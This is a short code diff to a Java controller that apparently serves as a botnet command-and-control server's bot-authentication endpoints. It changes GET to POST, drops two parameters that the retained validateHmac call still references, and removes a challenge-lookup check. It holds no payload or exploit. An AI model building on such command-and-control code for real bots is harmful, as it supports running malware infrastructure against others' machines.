@@ -64,7 +64,7 @@ public class CommandController {
 
     //CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////
     
-    @RequestMapping(value = "/welcome", method = RequestMethod.GET)
+    @RequestMapping(value = "/welcome", method = RequestMethod.POST)
    	@ResponseBody
    	public Pairs<Long,Long> botFirstAcces(HttpServletResponse error) throws IOException {  
     		System.out.println("1");
@@ -82,14 +82,14 @@ public class CommandController {
     		return response;
    	}
     
-    @RequestMapping(value = "/welcome/hmac", method = RequestMethod.GET)
+    @RequestMapping(value = "/welcome/hmac", method = RequestMethod.POST)
    	@ResponseBody
-   	public String botFirstAccesSecondPhase(Long keyNumber,Long iterationNumber,String hashMac,HttpServletResponse error) throws IOException {  
+   	public String botFirstAccesSecondPhase(String hashMac, HttpServletResponse error) throws IOException {  
     	String response="";
 		System.out.println("3");
 
     	if(engineBot.isCommandandconquerStatus()){
-    		if(auth.findBotChallengeInfo(keyNumber, iterationNumber))
+    	
     			if(auth.validateHmac(keyNumber, iterationNumber, hashMac))
     				response="Challenge OK";
     	}else{
